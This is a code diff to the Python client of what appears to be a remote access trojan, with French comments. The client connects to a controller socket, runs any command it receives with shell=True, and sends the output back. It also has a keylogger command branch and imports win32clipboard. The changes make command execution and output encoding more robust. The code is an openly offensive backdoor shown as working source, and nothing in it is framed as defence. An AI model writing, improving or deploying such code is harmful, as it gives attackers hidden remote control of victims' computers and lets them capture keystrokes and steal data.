@@ -10,6 +10,9 @@ import win32clipboard
 from win32com.makegw.makegwparse import *
 from _thread import *
 
+#pour la compil
+import imp
+
 ClientSocket = socket.socket()
 host = '127.0.0.1'
 port = 1233
@@ -227,7 +230,7 @@ ClientSocket.send(message.encode())
 
 while True:
     # receive the command from the server
-    command = ClientSocket.recv(BUFFER_SIZE).decode('utf-8')
+    command = ClientSocket.recv(BUFFER_SIZE).decode('utf-8', "ignore")
     splited_command = command.split()
     print(command)
     #output = subprocess.getoutput(command)
@@ -270,12 +273,16 @@ while True:
             output = ""
     elif splited_command[0].lower() != "keylogger":
         # execute the command and retrieve the results
-        output = subprocess.getoutput(command)
+        resCmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
+        output, err = resCmd.communicate()
+        output = output.decode('cp850')
+        print("commande effectuer")
     # get the current working directory as output
     cwd = os.getcwd()
     # send the results back to the server
     message = f"{output}{SEPARATOR}{cwd}"
-    ClientSocket.send(message.encode())
+    ClientSocket.send(message.encode('utf-8'))
+    print("Resultat Envoyer")
 
 
     #Input = input('Say Something: ')
